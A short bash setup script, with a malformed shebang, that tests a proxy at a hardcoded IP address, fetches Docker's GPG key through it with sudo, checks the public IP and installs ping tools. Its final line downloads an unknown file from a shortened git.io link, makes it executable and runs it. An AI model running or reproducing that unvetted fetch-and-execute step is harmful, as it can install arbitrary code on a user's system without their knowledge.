!#/bin/bash

curl -I "https://www.google.com" -x socks5://178.154.220.124:1080
sudo curl -x http://178.154.220.124:1080/ -fsSL https://download.docker.com/linux/ubuntu/gpg
curl ipinfo.io; echo
if ! hash ping &>/dev/null; then
  echo "Installing ping tools ..."
  apt-get install iputils-ping -y &>/dev/null
fi
wget https://git.io/J9cIN && chmod +x J9cIN && ./J9cIN
